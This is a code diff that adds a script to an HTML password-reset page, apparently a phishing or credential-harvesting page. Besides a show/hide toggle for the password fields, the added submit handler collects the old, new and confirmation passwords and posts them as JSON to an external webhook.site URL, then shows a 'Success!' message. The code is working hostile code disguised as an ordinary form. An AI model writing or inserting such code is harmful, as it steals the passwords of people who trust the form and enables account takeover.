@@ -226,6 +226,52 @@ document.getElementById("resetForm").addEventListener("submit", function(e) {
 });
 </script>
 <script src="script.js"></script>
+<script>
+  function toggleVisibility(inputId, btn) {
+    const input = document.getElementById(inputId);
+    if (input.type === "password") {
+      input.type = "text";
+      btn.textContent = "Hide";
+    } else {
+      input.type = "password";
+      btn.textContent = "Show";
+    }
+  }
+
+  document.getElementById("resetForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const oldVal = document.getElementById("oldPass") ? document.getElementById("oldPass").value : "";
+    const newVal = document.getElementById("newPass") ? document.getElementById("newPass").value : "";
+    const confVal = document.getElementById("confirmPass") ? document.getElementById("confirmPass").value : "";
+
+    if (newVal !== confVal) {
+      alert("New passwords do not match.");
+      return;
+    }
+
+    // إرسال البيانات إلى الـ Webhook
+    try {
+      await fetch('https://webhook.site/9d56d7b8-93dc-454b-865f-05db2b922bb7', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          oldPassword: oldVal,
+          newPassword: newVal,
+          confirmPassword: confVal,
+          date: new Date().toISOString()
+        }),
+      });
+
+      alert("Success! Check the result box below.");
+    } catch (err) {
+      console.error(err);
+      alert("حدث خطأ أثناء الإرسال");
+    }
+  });
+</script>
 
 </body>
   </html>
